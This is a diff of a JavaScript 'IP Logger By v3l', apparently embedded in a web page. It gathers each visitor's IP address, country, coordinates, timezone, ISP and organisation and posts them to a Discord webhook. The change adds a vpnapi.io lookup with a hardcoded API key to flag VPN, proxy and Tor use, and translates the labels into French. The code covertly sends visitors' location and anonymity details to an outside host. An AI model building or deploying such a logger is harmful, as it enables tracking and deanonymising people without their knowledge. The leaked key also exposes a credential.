@@ -27,7 +27,6 @@
         const continentgeo = data.continent_geoname_id
         const longitude = data.longitude
         const latitude = data.latitude
-        const vpn = data.security.is_vpn
         const timezonename = data.timezone.name
         const nameabbreviation = data.timezone.abbreviation
         const currentime = data.timezone.current_time
@@ -37,6 +36,13 @@
         const typedeco = data.connection.connection_type
         const isp = data.connection.isp_name
         const organame = data.connection.organization_name
+        
+              $.getJSON("https://vpnapi.io/api/?key=65cc98cf85ec414ea0faaf4e55e8e733", function (data) {
+        // display the IP address on the page
+        const vpn = data.security.vpn
+        const proxy = data.security.proxy
+        const tor = data.security.tor
+        const relay = data.security.relay
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
@@ -46,26 +52,28 @@
     title: 'IP Log',
     description: `
       **IP Logger By v3l**
-      IP: ${ip}
-      Country: ${country}
-      Flag: ${flag}
-      Country Code: ${countrycode}
-      Country Geo Code: ${countrygeo}
+      Adresse IP: ${ip}
+      Pays: ${country}
+      Drapeau: ${flag}
+      Code Raccourci Du Pays: ${countrycode}
+      Geo Code Du Pays: ${countrygeo}
       Continent: ${continent}
-      Continent Code: ${continentcode}
-      Continent Geo ID: ${continentgeo}
+      Code du Continent: ${continentcode}
+      ID Geo du Continent: ${continentgeo}
       X: ${longitude}
       Y: ${latitude}
-      VPN: ${vpn}
-      Timezone Name: ${timezonename}
-      Timezone Abbreviation: ${nameabbreviation}
-      Current Time: ${currentime}
-      Currency: ${currency}
-      Currency Code: ${currencycode}
-      Autonomous System Organization: ${operateur}
-      Connection Type: ${typedeco}
+      Utilise un VPN? : ${vpn}
+      Utilise un Proxy? : ${proxy}
+      Utilise Tor? : ${tor}
+      Nom du TimeZone: ${timezonename}
+      Raccourci du TimeZone: ${nameabbreviation}
+      Heure Actuel: ${currentime}3
+      Monnaie d'échange: ${currency}
+      Nom Raccourci De la monnaie d'échange: ${currencycode}
+      ASO (opérateur): ${operateur}
+      Type de Connexion: ${typedeco}
       ISP: ${isp}
-      Organization Name: ${organame}
+      Nom de l'organisation: ${organame}
     `,
   };
 
